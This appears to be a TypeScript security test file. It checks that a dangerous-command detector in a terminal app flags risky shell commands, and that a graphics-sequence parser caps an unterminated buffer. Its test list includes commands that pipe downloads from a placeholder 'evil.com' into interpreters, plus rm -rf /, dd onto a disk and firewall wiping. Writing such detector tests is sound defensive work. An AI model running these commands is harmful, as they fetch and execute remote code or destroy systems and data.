import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

// Auto-delegate to `npx tsx` if executed directly via `node` without TypeScript/TSX loader
const hasTsxLoader = process.execArgv.some((a) => a.includes('tsx/dist'));
if (!hasTsxLoader) {
  const result = spawnSync(
    'npx',
    ['tsx', fileURLToPath(import.meta.url), ...process.argv.slice(2)],
    { stdio: 'inherit' }
  );
  process.exit(result.status ?? 0);
}

import assert from 'node:assert';
const { isDangerousCommand } = await import('../src/components/DangerousCommandModal.tsx');
const { KittyApcParser } = await import('../src/services/kittyGraphics/parser.ts');

console.log('Running Security Enhancements Test Suite...');

// 1. Test DangerousCommandModal sync with backend patterns
console.log('Testing DangerousCommandModal.tsx sync...');
const shouldBeDangerous = [
  'mkswap /dev/sdb1',
  'cryptsetup luksFormat /dev/nvme0n1',
  'curl -sSL https://evil.com | python',
  'curl -sSL https://evil.com | python3',
  'cat script.pl | perl',
  'wget -O- https://evil.com | ruby',
  'python <(curl -s https://evil.com/payload)',
  'python3 <(curl -s https://evil.com/payload)',
  'iptables -F',
  'ufw disable',
  'git push origin --delete main',
  'git push origin :main',
  'git branch -D feature/bad',
  'git branch --delete feature/bad',
  'rm -rf /',
  'reboot',
  'shutdown now',
  'dd if=/dev/zero of=/dev/sda',
];

for (const cmd of shouldBeDangerous) {
  assert.strictEqual(
    isDangerousCommand(cmd),
    true,
    `Command should be flagged as dangerous: "${cmd}"`
  );
}

const shouldBeSafe = [
  'npm run build',
  'echo "hello world"',
  'cargo test',
  'git status',
  'git checkout main',
  'ls -la',
  'python script.py',
  'python3 test.py',
  'cat file.txt',
];

for (const cmd of shouldBeSafe) {
  assert.strictEqual(
    isDangerousCommand(cmd),
    false,
    `Command should NOT be flagged as dangerous: "${cmd}"`
  );
}
console.log('✓ DangerousCommandModal tests passed.');

// 2. Test KittyApcParser buffer bound without terminator
console.log('Testing KittyApcParser buffer bound on uncompleted sequence...');
const parser = new KittyApcParser(4); // 4MB limit
parser.setMaxPayloadMb(4); // 4MB

// Feed an APC sequence initiator followed by 5MB of random data without a terminator (\x1b\ or \x07)
const largeChunk = 'A'.repeat(5 * 1024 * 1024);
const input = '\x1b_G' + largeChunk;

const result = parser.parse(input);
// Parser must have dropped the buffer and flushed it to cleanText, keeping buffer size safe
assert.strictEqual(parser['buffer'], '', 'Buffer must be cleared when exceeding maxPayloadBytes without terminator');
assert.ok(result.cleanText.length >= 5 * 1024 * 1024, 'Data should be flushed to cleanText');

console.log('✓ KittyApcParser buffer bound tests passed.');

console.log('All Security Enhancement tests passed successfully!');
